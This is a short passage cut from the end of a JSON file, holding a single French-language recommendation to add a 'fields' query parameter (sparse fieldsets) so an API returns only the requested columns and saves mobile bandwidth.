            "Ajoutez un paramètre `?fields=id,titre` (*Sparse Fieldsets*) qui permet au client de ne recevoir que les colonnes demandées pour économiser la bande passante mobile."
        ]
    }
}
